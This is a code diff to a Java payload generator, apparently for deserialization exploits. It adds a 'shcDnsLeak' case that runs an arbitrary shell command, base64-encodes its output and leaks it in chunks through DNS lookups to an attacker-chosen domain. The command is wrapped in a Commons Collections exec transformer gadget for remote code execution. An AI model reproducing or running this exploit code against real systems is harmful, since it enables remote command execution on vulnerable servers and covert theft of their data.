@@ -654,6 +654,26 @@ public class Generator {
                 break;
             }
 
+            case "shcDnsLeak":{
+                final String domain = stmt.getString("domain");
+                final String exec = stmt.getString("val");
+                String execString = String.format(
+                        "ping -c 1 `%s | base64 | tr -d '=' | tr -d '\\n' | tr '+/' '-_'`.%s",
+                        exec, domain);
+
+                int step = 120;
+                if (stmt.has("offset")){
+                    int offset = stmt.getInt("offset");
+                    execString = String.format(
+                            "ping -c 1 `%s | base64 | tr -d '=' | tr -d '\\n' | tr '+/' '-_' | head -c %d | tail -c %d`.%s",
+                            exec, offset, step, domain);
+                }
+
+                final String[] execCmd = new String[] {"/bin/sh", "-c", execString};
+                result = Commons1Gadgets.getExecTransformer(execCmd);
+                break;
+            }
+
             case "execRuntime":{
                 final Object inp = stmt.get("val");
                 if (inp instanceof JSONArray){
